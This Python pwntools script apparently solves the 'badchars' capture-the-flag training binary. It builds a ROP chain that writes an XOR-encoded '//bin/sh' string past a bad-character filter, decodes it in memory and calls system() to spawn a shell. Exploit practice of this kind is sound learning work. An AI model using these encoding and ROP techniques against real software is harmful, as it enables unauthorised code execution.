from pwn import *
import sys

context(arch='amd64', os='linux')
binary_name = 'badchars'
p = process('./'+binary_name)
elf =  ELF(binary_name)
rop =  ROP(elf)

def check_chars(address):
	bad_chars = ["62", "69", "63", "2f", "20", "66", "6e", "73"]
	vals = hex(address).replace("0x","")
	vals2 = [vals[i:i+2] for i in range(0, len(vals), 2)]
	#print hex(address)
	for v in vals2:
		if v in bad_chars:
			print "Problem with %s"%hex(address)


def string_to_hex(string_, byte):
	a = "0x"
	for i in string_[::-1]:
		a += i.encode("hex")
	a = int(a, 16)
	xorer = int( ("0x"+byte*8) , 16)
	return (a ^ xorer)


system =  elf.sym["system"] 
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
# 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
writewhatwhere  = 0x400b34
# 0x0000000000400b3b : pop r12 ; pop r13 ; ret
pop_r12_r13_ret = 0x400b3b
# .data start address
writable_memory = 0x601077
# Encoded payload
command = 0x7a613d7c7b703d3d  
# 0x0000000000400b40 : pop r14 ; pop r15 ; ret
pop_r14_r15_ret = 0x400b40
# 0x0000000000400b30 : xor byte ptr [r15], r14b ; ret
xor_r15_r14 = 0x400b30

check_chars(command)
check_chars(system)
check_chars(pop_rdi)
check_chars(writewhatwhere)
check_chars(pop_r12_r13_ret)
check_chars(pop_r14_r15_ret)
check_chars(writable_memory)

rop =  "A"*40
rop += p64(pop_r12_r13_ret) + p64(command) + p64(writable_memory)
rop += p64(writewhatwhere)
for i in range(0,8):
	rop += p64(pop_r14_r15_ret) + p64(0x12) + p64(writable_memory+i)
	rop += p64(xor_r15_r14)
rop += p64(pop_rdi) + p64(writable_memory) + p64(system)

log.info("System address (.plt) - " + hex(system))
log.info("pop r12, pop r13, ret - " + hex(pop_r12_r13_ret))
log.info("pop r12, pop r13, ret - " + hex(pop_r14_r15_ret))
log.info("pop rdi, ret          - " + hex(pop_rdi))
log.info("Write-what-where      - " + hex(writewhatwhere))
log.info(".data section start   - " + hex(writable_memory))

p.recvuntil("> ")
p.send(rop)
p.interactive()